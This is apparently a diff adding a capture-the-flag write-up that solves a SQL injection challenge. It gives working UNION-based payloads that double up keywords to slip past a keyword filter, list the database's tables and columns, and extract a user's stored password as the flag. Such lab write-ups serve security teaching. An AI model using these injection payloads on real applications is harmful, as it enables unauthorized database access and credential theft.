@@ -1,0 +1,8 @@
+1. After solving dbName and dbUser problem I know that there are 14 columns in the table.
+2. This sql command is injected to get all the table names ' uunionnion selselectect null,table_name,null,null,null,null,null,null,null,null,null,null,null,null from infoorrmation_schema.columns#
+3. The above query gave us 3 user created databases student,conn and ft8835345.
+4. Since, my name should be present in the student database, I tried to find all the column names of the databases.
+5. Sql command injected: ' uunionnion selselectect null,column_name,null,null,null,null,null,null,null,null,null,null,null,null from infoorrmation_schema.columns#
+6. Executing the above sql command I noticed a column name called password.
+7. Then I injected this sql command to find my original password :' uunionnion selselectect null,passwoorrd,null,null,null,null,null,null,null,null,null,null,null,null from student whwhereere email='aneetk@iitk.ac.in'#
+8. Executing the above command I got my original password which is the flag.
